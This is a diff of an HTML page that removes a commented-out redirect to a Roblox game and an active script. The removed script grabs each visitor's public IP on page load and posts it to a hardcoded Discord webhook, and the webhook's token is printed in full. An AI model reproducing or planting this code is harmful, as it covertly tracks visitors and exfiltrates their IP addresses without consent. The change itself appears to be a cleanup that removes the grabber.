@@ -41,44 +41,7 @@
         </div>
     
 
-        <!--
-        <script>
-            window.location.replace("https://www.roblox.com/games/14615246136");
-        </script>
-    </body> -->
-    <script>
-    let typingTimeout;
-    
-    function sendMessage() {
-    clearTimeout(typingTimeout);
-    typingTimeout = setTimeout(() => {
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ipAddress = data.ip;
-        console.log(ipAddress);
-    
-        const usernameInput = document.getElementById('username');
-    
-        // Send Discord message via webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1155463981826326618/CMPUcRRfkxtGOu282SsLtiDDNudj51jzW20WRuGhvK80mdiEkePqGHwhJ4PxL5A21dfP';
-        const message = `IP Address: ${ipAddress}`;
-    
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({ content: message })
-        })
-        .then(response => console.log('Discord message sent successfully'))
-        .catch(error => console.error('Error sending Discord message:', error));
-      });
-    }, 1000); // 1000 milliseconds (1 second) cooldown before sending
-    }
-    
-    sendMessage()
-    </script>
+
     <script src="./assets/title.js"></script>
     </body>
 </html>
